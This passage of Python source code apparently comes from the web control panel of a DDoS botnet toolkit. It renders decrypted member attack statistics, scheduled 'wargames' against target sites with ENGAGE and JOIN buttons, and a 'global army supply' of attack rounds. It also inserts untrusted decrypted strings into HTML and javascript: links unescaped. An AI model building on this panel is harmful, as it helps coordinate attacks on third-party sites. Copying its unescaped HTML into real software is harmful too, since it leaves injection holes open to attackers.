                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_contact = str(grid_contact) # contact
                            if len(grid_contact) > 120 or len(grid_contact) < 3: # m[15] = grid_contact (>str3<str120)
                                grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            else:
                                try:
                                    if " " in grid_contact: # m[15] = grid_contact
                                        grid_contact = grid_contact.replace(" ","")
                                    grid_contact = "<a href=javascript:alert('"+str(grid_contact)+"');>View</a>" # js contact view
                                except:
                                    grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            try:            
                                grid_id = m[16] # id
                            except:
                                grid_id = '6666666666666666666666666666666666666' # fake id
                        elif version == 15:
                            grid_contact = m[14] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_contact = str(grid_contact) # contact
                            if len(grid_contact) > 120 or len(grid_contact) < 3: # m[14] = grid_contact (>str3<str120)
                                grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            else:
                                try:
                                    if " " in grid_contact: # m[14] = grid_contact
                                        grid_contact = grid_contact.replace(" ","")
                                    grid_contact = "<a href=javascript:alert('"+str(grid_contact)+"');>View</a>" # js contact view
                                except:
                                    grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            try:            
                                grid_id = m[15] # id
                            except:
                                grid_id = '6666666666666666666666666666666666666' # fake id
                        elif version == 12:
                            grid_contact = m[11] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_contact = str(grid_contact) # contact
                            if len(grid_contact) > 120 or len(grid_contact) < 3: # m[11] = grid_contact (>str3<str120)
                                grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            else:
                                try:
                                    if " " in grid_contact: # m[11] = grid_contact
                                        grid_contact = grid_contact.replace(" ","")
                                    grid_contact = "<a href=javascript:alert('"+str(grid_contact)+"');>View</a>" # js contact view
                                except:
                                    grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            try:            
                                grid_id = m[12] # id
                            except:
                                grid_id = '6666666666666666666666666666666666666' # fake id
                        elif version == 11:
                            grid_contact = m[10] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_contact = str(grid_contact) # contact
                            if len(grid_contact) > 120 or len(grid_contact) < 3: # m[10] = grid_contact (>str3<str120)
                                grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            else:
                                try:
                                    if " " in grid_contact: # m[10] = grid_contact
                                        grid_contact = grid_contact.replace(" ","")
                                    grid_contact = "<a href=javascript:alert('"+str(grid_contact)+"');>View</a>" # js contact view
                                except:
                                    grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            try:            
                                grid_id = m[11] # id
                            except:
                                grid_id = '6666666666666666666666666666666666666' # fake id
                        elif version == 10:
                            grid_contact = m[9] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_contact = str(grid_contact) # contact
                            if len(grid_contact) > 120 or len(grid_contact) < 3: # m[9] = grid_contact (>str3<str120)
                                grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            else:
                                try:
                                    if " " in grid_contact: # m[9] = grid_contact
                                        grid_contact = grid_contact.replace(" ","")
                                    grid_contact = "<a href=javascript:alert('"+str(grid_contact)+"');>View</a>" # js contact view
                                except:
                                    grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            try:            
                                grid_id = m[10] # id
                            except:
                                grid_id = '6666666666666666666666666666666666666' # fake id
                        else: 
                            grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            grid_id = '6666666666666666666666666666666666666' # fake id
                    try: # parsing for valid stream struct
                        grid_ranking = str(grid_ranking)
                        if grid_ranking == nodec_text: # hide any data when user is encrypted
                            grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>"
                            grid_table += "<tr><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(grid_contact)+"</td></tr>"
                        else:
                            grid_table += "<tr><td align='center'>"+str(grid_nickname)+"</td><td align='center'>"+str(grid_ranking)+"</td><td align='center'>"+str(grid_totalchargo)+"</td><td align='center'>"+str(grid_dorking)+"</td><td align='center'>"+str(grid_transferred)+"</td><td align='center'>"+str(grid_maxchargo)+"</td><td align='center'>"+str(grid_missions)+"</td><td align='center'>"+str(grid_attacks)+"</td><td align='center'>"+str(grid_loic)+"</td><td align='center'>"+str(grid_loris)+"</td><td align='center'>"+str(grid_ufosyn)+"</td><td align='center'>"+str(grid_spray)+"</td><td align='center'>"+str(grid_smurf)+"</td><td align='center'>"+str(grid_xmas)+"</td><td align='center'>"+str(grid_nuke)+"</td><td align='center'>"+str(grid_tachyon)+"</td><td align='center'>"+str(grid_monlist)+"</td><td align='center'>"+str(grid_fraggle)+"</td><td align='center'>"+str(grid_sniper)+"</td><td align='center'>"+str(grid_ufoack)+"</td><td align='center'>"+str(grid_uforst)+"</td><td align='center'>"+str(grid_droper)+"</td><td align='center'>"+str(grid_overlap)+"</td><td align='center'>"+str(grid_pinger)+"</td><td align='center'>"+str(grid_ufoudp)+"</td><td align='center'>"+str(grid_contact)+"</td></tr>"
                    except:
                        grid_table += "<tr><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td></tr>"
                grid_table += "</table><br>"
                l = time.ctime(os.path.getmtime(self.grid_file)) # get last modified time
                mother_table = "<center><u>MOTHERSHIP STATS:</u> (Last Update: <font color='green'>"+str(l)+"</font>)</center><br><table cellpadding='5' cellspacing='5' border='1'><tr><td><font color='green'>MEMBERS:</font></td><td align='right'><font color='green'>"+str(mothership_members)+"</font></td><td><font color='orange' size='4'>-</font></td><td align='right'><font color='orange' size='4'>"+str(unknown_members)+"</font></td><td><font color='white' size='4'>*</font></td><td align='right'><font color='white' size='4'>"+str(member_1)+"</font></td><td><font color='cyan' size='4'>**</font></td><td align='right'><font color='cyan' size='4'>"+str(member_2)+"</font></td><td><font color='blueviolet' size='4'>***</font></td><td align='right'><font color='blueviolet' size='4'>"+str(member_3)+"</font></td><td><font color='blue' size='4'>****</font></td><td align='right'><font color='blue' size='4'>"+str(member_4)+"</font></td><td><font color='red' size='4'>&#x25BC;</font></td><td align='right'><font color='red' size='4'>"+str(member_5)+"</font></td></tr></table><br><table cellpadding='5' cellspacing='5' border='1'><tr><td>MISSIONS:</td><td align='right'>"+str(mothership_missions)+"</td><td>ATTACKS:</td><td align='right'>"+str(mothership_attacks)+"</td><td>CHARGO (ACTIVE!):</td><td align='right'>"+str(mothership_chargo)+"</td><td>DORKING:</td><td align='right'>"+str(mothership_dorking)+"</td><td>TRANSF:</td><td align='right'>"+str(mothership_transferred)+"</td><td>MAX.CHARGO:</td><td align='right'>"+str(mothership_maxchargo)+"</td></tr></table><br><table cellpadding='5' cellspacing='5' border='1'><tr><td>LOIC:</td><td align='right'>"+str(mothership_loic)+"</td><td>LORIS:</td><td align='right'>"+str(mothership_loris)+"</td><td>UFOSYN:</td><td align='right'>"+str(mothership_ufosyn)+"</td><td>SPRAY:</td><td align='right'>"+str(mothership_spray)+"</td><td>SMURF:</td><td align='right'>"+str(mothership_smurf)+"</td></tr><tr><td>XMAS:</td><td align='right'>"+str(mothership_xmas)+"</td><td>NUKE:</td><td align='right'>"+str(mothership_nuke)+"</td><td>TACHYON:</td><td align='right'>"+str(mothership_tachyon)+"</td><td>MONLIST:</td><td align='right'>"+str(mothership_monlist)+"</td></tr><tr><td>FRAGGLE:</td><td align='right'>"+str(mothership_fraggle)+"</td><td>SNIPER:</td><td align='right'>"+str(mothership_sniper)+"</td><td>UFOACK:</td><td align='right'>"+str(mothership_ufoack)+"</td><td>UFORST:</td><td align='right'>"+str(mothership_uforst)+"</td></tr><tr><td>DROPER:</td><td align='right'>"+str(mothership_droper)+"</td><td>OVERLAP:</td><td align='right'>"+str(mothership_overlap)+"</td><td>PINGER:</td><td align='right'>"+str(mothership_pinger)+"</td><td>UFOUDP:</td><td align='right'>"+str(mothership_ufoudp)+"</td></tr></table><br><hr><br>"
                f.write(mother_table)
                f.write(grid_table)
                f.write(end_mark)
                f.close()  
            else: # not valid stream data
                pass
        if page == "/cmd_decrypt_grid_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_decrypt_grid_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_decrypt_wargames":
            self.pages["/cmd_decrypt_wargames"] = "<pre>Waiting for decrypting results...</pre>"
            wargames_join_flag = False # anti-join flag for non decrypted wargames
            try:
                wargames_deckey = pGet["wargames_deckey"]
            except:
                wargames_deckey = ""
            end_mark = "[Info] [AI] End of decryption."
            if wargames_deckey is not "": # wargames decryption
                nodec_text = "KEY?"
                try: # read global army supply from configuration file (json)
                    with open(self.mothership_supplycfg_file) as data_file:
                        data = json.load(data_file)
                except:
                    if os.path.exists(self.mothership_supplycfg_file) == True:
                        print('[Error] [AI] Cannot open: "core/json/supplycfg.json" -> [Aborting!]\n')
                        return
                    else: # generate default global army supply configuration file
                        print('[Info] [AI] Cannot found: "core/json/supplycfg.json" -> [Generating!]')
                        with open(self.mothership_supplycfg_file, "w") as f:
                            json.dump({"botnet": 1, "loic": 0, "loris": 0, "ufosyn": 0, "spray": 0, "smurf": 0, "xmas": 0, "nuke": 0, "tachyon": 0, "monlist": 0, "fraggle": 0, "sniper": 0, "ufoack": 0, "uforst": 0, "droper": 0, "overlap": 0, "pinger": 0, "ufoudp": 0}, f, indent=4)
                with open(self.mothership_supplycfg_file) as data_file:
                    data = json.load(data_file)
                self.supply_botnet = data["botnet"]
                self.supply_loic = data["loic"]
                self.supply_loris = data["loris"]
                self.supply_ufosyn = data["ufosyn"]
                self.supply_spray = data["spray"]
                self.supply_smurf = data["smurf"]
                self.supply_xmas = data["xmas"]
                self.supply_nuke = data["nuke"]
                self.supply_tachyon = data["tachyon"]
                self.supply_monlist = data["monlist"]
                self.supply_fraggle = data["fraggle"]
                self.supply_sniper = data["sniper"]
                self.supply_ufoack = data["ufoack"]
                self.supply_uforst = data["uforst"]
                self.supply_droper = data["droper"]
                self.supply_overlap = data["overlap"]
                self.supply_pinger = data["pinger"]
                self.supply_ufoudp = data["ufoudp"]
                f = open(self.wargames_file,"r")
                ls = f.readlines()
                f.close()
                if ls:
                    wargames_autopanel = "<u>MASSIVE ACTION</u>:<br><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><button title='Remove ALL: -CLOSED-' onclick=JobRemoveAll('"+str(wargames_deckey)+"')>-PURGE-</button></td><td align='center'><button style='background-color:cyan;height:50px;width:120px' title='Engage ALL: -ONGOING-' onclick=JobAddAll()>ENGAGE ALL!</button></td><td align='center'><button style='background-color:red;height:50px;width:120px' title='Cancel ALL: JOINED!' onclick=JobCancelAll()>PANIC!!!</button></td></tr></table><br><br>"
                    wargames_supply = "<u>GLOBAL ARMY SUPPLY (rounds)</u>:<br><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'>BOTNET ("+str(self.total_botnet)+"):</td><td align='center'>LOIC:</td><td align='center'>LORIS:</td><td align='center'>UFOSYN:</td><td align='center'>SPRAY:</td><td align='center'>FRAGGLE:</td><td align='center'>SNIPER:</td><td align='center'>UFOACK:</td><td align='center'>UFORST:</td></tr><tr><td align='center'><input type='number' min='1' max='99999' required id='supply_botnet' value='"+str(self.supply_botnet)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_loic' value='"+str(self.supply_loic)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_loris' value='"+str(self.supply_loris)+"'  style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_ufosyn' value='"+str(self.supply_ufosyn)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_spray' value='"+str(self.supply_spray)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_fraggle' value='"+str(self.supply_fraggle)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_sniper' value='"+str(self.supply_sniper)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_ufoack' value='"+str(self.supply_ufoack)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_uforst' value='"+str(self.supply_uforst)+"' style='text-align: center;' readonly></td></tr><tr><td align='center'>SMURF:</td><td align='center'>XMAS:</td><td align='center'>NUKE:</td><td align='center'>TACHYON:</td><td align='center'>MONLIST:</td><td align='center'>DROPER:</td><td align='center'>OVERLAP:</td><td align='center'>PINGER:</td><td align='center'>UFOUDP:</td></tr><tr><td align='center'><input type='number' min='0' max='99999' required id='supply_smurf' value='"+str(self.supply_smurf)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_xmas' value='"+str(self.supply_xmas)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_nuke' value='"+str(self.supply_nuke)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_tachyon' value='"+str(self.supply_tachyon)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_monlist' value='"+str(self.supply_monlist)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_droper' value='"+str(self.supply_droper)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_overlap' value='"+str(self.supply_overlap)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_pinger' value='"+str(self.supply_pinger)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_ufoudp' value='"+str(self.supply_ufoudp)+"' style='text-align: center;' readonly></td><td align='center'><button id='supply_edit' title='Edit global army supply...' value='EDIT' onclick=EditSupply()>EDIT</button></td></tr></table><br><br>" 
                else:
                    wargames_autopanel = ""
                    wargames_supply = ""
                wargames_table = wargames_autopanel + wargames_supply +"<table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><a id='filter_creation' style='color:red;text-decoration:underline red;' onclick=javascript:JobFilter('creation','"+str(wargames_deckey)+"');>CREATION:</a></td><td align='center'><a id='filter_target' style='color:red;text-decoration:underline red;' onclick=javascript:JobFilter('target','"+str(wargames_deckey)+"')>TARGET:</a></td><td align='center'><a id='filter_estimated' style='color:red;text-decoration:underline red;' onclick=javascript:JobFilter('estimated','"+str(wargames_deckey)+"')>DATE:</a></td><td align='center'><u>ETA:</u></td><td align='center'><u>ACTION:</u></td><td align='center'><u>STATUS:</u></td></tr>"
                f = open("/tmp/out", "w")
                self.list_wargames_rev = reversed(self.list_wargames) # order by DESC
                wargames_id = 1
                for m in self.list_wargames_rev: # list = creation, target, estimated
                    if wargames_msg_sep in m:
                        m = m.split(wargames_msg_sep)
                        wargames_creation = m[0] # creation date
                        self.decrypt(wargames_deckey, wargames_creation)
                        if self.decryptedtext:
                            wargames_creation = self.decryptedtext
                        else:
                            wargames_creation = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        wargames_target = m[1] # target
                        wargames_target_joined = wargames_target
                        self.decrypt(wargames_deckey, wargames_target)
                        if self.decryptedtext:
                            wargames_target = self.decryptedtext
                            if wargames_target.startswith("www."):
                                wargames_target = wargames_target.replace("www.","")
                        else:
                            wargames_target = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        wargames_estimated = m[2] # estimated time
                        self.decrypt(wargames_deckey, wargames_estimated)
                        if self.decryptedtext:
                            wargames_estimated = self.decryptedtext
                            wargames_join_flag = True
                        else:
                            wargames_estimated = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                    else:
                        wargames_target = "KEY?"
                    now = strftime("%d-%m-%Y %H:%M:%S", gmtime())
                    now = strptime(now, "%d-%m-%Y %H:%M:%S")
                    try:
                        wargames_creation = strptime(wargames_creation, "%d-%m-%Y %H:%M:%S")
                        wargames_estimated = strptime(wargames_estimated, "%d-%m-%Y %H:%M:%S")
                    except: # discarding errors also on panel
                        wargames_creation = now
                        wargames_estimated = now
                    if wargames_target == "KEY?": # allow to discard unencrypted wargames
                        wargames_creation = now
                        wargames_estimated = now
                    if (now >= wargames_estimated) == False: # change flag color when time is out
                        time_now = time.mktime(now)
                        time_estimated = time.mktime(wargames_estimated)
                        wargames_eta = (time_estimated - time_now)
                        hours, rem = divmod(wargames_eta, 3600)
                        minutes, seconds = divmod(rem, 60)
                        if "!!!" in wargames_target_joined:
                            status = "JOINED!"
                            wargames_status = "<font color='cyan'>"+status+"</font>"
                            if wargames_join_flag == True:
                                wargames_join = "<button id="+str(wargames_id)+" title='Cancel this battle...' onclick=JobCancel('"+str(wargames_id)+"')>CANCEL</button>"
                            else: 
                                wargames_join = "KEY?" # present but with a different crypto-key
                            wargames_eta = "<font color='cyan'>{:0>2}h {:0>2}m {:02}s</font>".format(int(hours),int(minutes),int(seconds))
                            wargames_estimated = strftime("%d-%m-%Y %H:%M:%S", wargames_estimated)
                            time_flag = "<font color='cyan'>"+str(wargames_estimated)+"</font>"
                            wargames_creation = strftime("%d-%m-%Y %H:%M:%S", wargames_creation)
                            creation_flag = "<font color='cyan'>"+str(wargames_creation)+"</font>"
                        else:
                            status = "-ONGOING-"
                            wargames_status = "<font color='orange'>"+status+"</font>"
                            if wargames_join_flag == True:
                                wargames_join = "<button id="+str(wargames_id)+" title='Join this battle...' onclick=JobAdd('"+str(wargames_id)+"')>ENGAGE!</button>"
                            else: 
                                wargames_join = "KEY?" # present but with a different crypto-key
                            wargames_eta = "<font color='orange'>{:0>2}h {:0>2}m {:02}s</font>".format(int(hours),int(minutes),int(seconds))
                            wargames_estimated = strftime("%d-%m-%Y %H:%M:%S", wargames_estimated)
                            time_flag = "<font color='orange'>"+str(wargames_estimated)+"</font>"
                            wargames_creation = strftime("%d-%m-%Y %H:%M:%S", wargames_creation)
                            creation_flag = "<font color='orange'>"+str(wargames_creation)+"</font>"
                    else:
                        wargames_estimated = strftime("%d-%m-%Y %H:%M:%S", wargames_estimated)
                        time_flag = "<font color='red'><s>"+str(wargames_estimated)+"</s></font>"
                        wargames_creation = strftime("%d-%m-%Y %H:%M:%S", wargames_creation)
                        creation_flag = "<font color='red'>"+str(wargames_creation)+"</font>"
                        wargames_join = "<button id="+str(wargames_id)+" title='Remove this battle...' onclick=JobRemove('"+str(wargames_id)+"')>REMOVE</button>"
                        wargames_eta = "<font color='red'>OUT-OF-TIME</font>"
                        status = "-CLOSED-"
                        wargames_status = "<font color='red'>"+status+"</font>"
                    wargames_table += "<tr><td align='center'>"+creation_flag+"</td><td align='center'><a href='http://"+str(wargames_target)+"' target='_blank'>"+str(wargames_target)+"</a></td><td align='center'>"+time_flag+"</td><td align='center'>"+wargames_eta+"</td><td align='center'>"+wargames_join+"</td><td align='center'>"+wargames_status+"</td></tr>"
                    wargames_id = wargames_id + 1
                wargames_table += "</table><br>"
                f.write(wargames_table)
                f.write(end_mark)
                f.close()
        if page == "/cmd_decrypt_wargames_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_decrypt_wargames_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_decrypt_links":
            self.pages["/cmd_decrypt_links"] = "<pre>Waiting for decrypting results...</pre>"
            try:
                link_deckey = pGet["link_deckey"]
            except:
                link_deckey = ""
            end_mark = "[Info] [AI] End of decryption."
            if link_deckey is not "": # links decryption
                nodec_text = "KEY?"
                links_table = "<table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><a id='filter_creation' style='color:red;text-decoration:underline red;' onclick=javascript:LinkFilter('creation','"+str(link_deckey)+"');>CREATION:</a></td><td align='center'><a id='filter_topic' style='color:red;text-decoration:underline red;' onclick=javascript:LinkFilter('topic','"+str(link_deckey)+"')>TOPIC:</a></td><td align='center'><a id='filter_url' style='color:red;text-decoration:underline red;' onclick=javascript:LinkFilter('url','"+str(link_deckey)+"')>URL:</a></td></tr>"
                f = open("/tmp/out", "w")
                self.list_links_rev = reversed(self.list_links) # order by DESC
                for m in self.list_links_rev: # list = creation, topic, url
                    if links_msg_sep in m:
                        m = m.split(links_msg_sep)
                        link_creation = m[0] # creation date
                        self.decrypt(link_deckey, link_creation)
                        if self.decryptedtext:
                            link_creation = self.decryptedtext
                        else:
                            link_creation = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        link_url = m[1] # url
                        self.decrypt(link_deckey, link_url)
                        if self.decryptedtext:
                            link_url = self.decryptedtext
                            if link_url.startswith("www."):
                                link_url = link_url.replace("www.","")
                        else:
                            link_url = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        link_topic = m[2] # topic
                        self.decrypt(link_deckey, link_topic)
                        if self.decryptedtext:
                            link_topic = self.decryptedtext
                        else:
                            link_topic = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                    else:
                        link_url = "KEY?"
                    links_table += "<tr><td align='center'>"+link_creation+"</td><td align='center'>"+link_topic+"</td><td align='center'><a href='"+str(link_url)+"' target='_blank'>"+str(link_url)+"</a></td></tr>"
                links_table += "</table><br>"
                f.write(links_table)
                f.write(end_mark)
                f.close()
        if page == "/cmd_decrypt_links_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_decrypt_links_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_decrypt_streams":
            self.pages["/cmd_decrypt_streams"] = "<pre>Waiting for decrypting results...</pre>"
            try:
                stream_deckey = pGet["stream_deckey"]
            except:
                stream_deckey = ""
            end_mark = "[Info] [AI] End of decryption."
            if stream_deckey is not "": # streams decryption
                nodec_text = "KEY?"
                streams_table = "<table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><a id='filter_creation' style='color:red;text-decoration:underline red;' onclick=javascript:StreamFilter('creation','"+str(stream_deckey)+"');>CREATION:</a></td><td align='center'><a id='filter_topic' style='color:red;text-decoration:underline red;' onclick=javascript:StreamFilter('topic','"+str(stream_deckey)+"')>TOPIC:</a></td><td align='center'><a id='filter_url' style='color:red;text-decoration:underline red;' onclick=javascript:StreamFilter('url','"+str(stream_deckey)+"')>STREAM:</a></td><td align='center'>VIDEO:</td></tr>"
                f = open("/tmp/out", "w")
                self.list_streams_rev = reversed(self.list_streams) # order by DESC
                stream_num = 0 
                for m in self.list_streams_rev: # list = creation, topic, url
                    if streams_msg_sep in m:
                        m = m.split(streams_msg_sep)
                        stream_creation = m[0] # creation date
                        self.decrypt(stream_deckey, stream_creation)
                        if self.decryptedtext:
                            stream_creation = self.decryptedtext
                        else:
                            stream_creation = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        stream_url = m[1] # url
                        self.decrypt(stream_deckey, stream_url)
                        if self.decryptedtext:
                            stream_url = self.decryptedtext
                            if stream_url.startswith("www."):
                                stream_url = stream_url.replace("www.","")
                        else:
                            stream_url = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        stream_topic = m[2] # topic
                        self.decrypt(stream_deckey, stream_topic)
                        if self.decryptedtext:
                            stream_topic = self.decryptedtext
                        else:
                            stream_topic = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        stream_id = str(stream_url.split("v=")[1]) # extract (Youtube) VideoID
                        stream_num = stream_num + 1
                    else:
                        stream_url = "KEY?"
                        stream_id = None
                    streams_table += "<tr><td align='center'>"+stream_creation+"</td><td align='center'>"+stream_topic+"</td><td align='center'><a href='"+str(stream_url)+"' target='_blank'>"+str(stream_url)+"</a></td><td align='center'><button id='play_button_"+str(stream_num)+"' value='"+str(stream_id)+"' onclick='PlayStream("+str(stream_num)+");return false;'>PLAY!</button><div id='video_"+str(stream_num)+"'></div></td></tr>"
                streams_table += "</table><br>"
                f.write(streams_table)
                f.write(end_mark)
                f.close()
        if page == "/cmd_decrypt_streams_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_decrypt_streams_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_decrypt_globalnet":
            self.pages["/cmd_decrypt_globalnet"] = "<pre>Waiting for decrypting results...</pre>"
            try:
                globalnet_deckey = pGet["globalnet_deckey"]
            except:
                globalnet_deckey = ""
            end_mark = "[Info] [AI] End of decryption."
            if globalnet_deckey is not "": # globalnet decryption
                nodec_text = "KEY?"
                globalnet_table = "<table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><a id='filter_owner' style='color:red;text-decoration:underline red;' onclick=javascript:GlobalnetFilter('owner','"+str(globalnet_deckey)+"');>OWNER:</a></td><td align='center'><a id='filter_comment' style='color:red;text-decoration:underline red;' onclick=javascript:GlobalnetFilter('comment','"+str(globalnet_deckey)+"')>COMMENT:</a></td><td align='center'><a id='filter_warp' style='color:red;text-decoration:underline red;' onclick=javascript:GlobalnetFilter('warp','"+str(globalnet_deckey)+"')>WARPING:</a></td><td align='center'><a id='filter_ip' style='color:red;text-decoration:underline red;' onclick=javascript:GlobalnetFilter('ip','"+str(globalnet_deckey)+"')>IP:</a></td></tr>"
                f = open("/tmp/out", "w")
                self.list_globalnet_rev = reversed(self.list_globalnet) # order by DESC
                for m in self.list_globalnet_rev: # list = owner, comment, warping, ip
                    if globalnet_msg_sep in m:
                        m = m.split(globalnet_msg_sep)
                        globalnet_owner = m[0] # owner
                        self.decrypt(globalnet_deckey, globalnet_owner)
                        if self.decryptedtext:
                            globalnet_owner = self.decryptedtext
                        else:
                            globalnet_owner = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        globalnet_comment = m[1] # comment
                        self.decrypt(globalnet_deckey, globalnet_comment)
                        if self.decryptedtext:
                            globalnet_comment = self.decryptedtext
                        else:
                            globalnet_comment = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        globalnet_warp = m[2] # warp
                        self.decrypt(globalnet_deckey, globalnet_warp)
                        if self.decryptedtext:
                            globalnet_warp = self.decryptedtext
                        else:
                            globalnet_warp = nodec_text
                        if globalnet_warp == "OFF":
                            warp_color = "pink" 
                        elif globalnet_warp == "ON1":
                            warp_color = "orange"
                        else: # ON2
                            warp_color = "blue"
                        self.decryptedtext = "" # clean decryptedtext buffer
                        globalnet_ip = m[3] # ip
                        self.decrypt(globalnet_deckey, globalnet_ip)
                        if self.decryptedtext:
                            globalnet_ip = self.decryptedtext
                        else:
                            globalnet_ip = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                    else:
                        globalnet_owner = "KEY?"
                        globalnet_comment = "KEY?"
                    globalnet_table += "<tr><td align='center'>"+str(globalnet_owner)+"</td><td align='center'>"+str(globalnet_comment)+"</td><td align='center'><font color="+warp_color+">"+str(globalnet_warp)+"</font></td><td align='center'><font color="+warp_color+">"+str(globalnet_ip)+"</font></td></tr>"
                globalnet_table += "</table><br>"
                f.write(globalnet_table)
                f.write(end_mark)
                f.close()
        if page == "/cmd_decrypt_globalnet_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_decrypt_globalnet_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/blackholes":
            self.pages["/blackholes"] = self.html_blackholes()
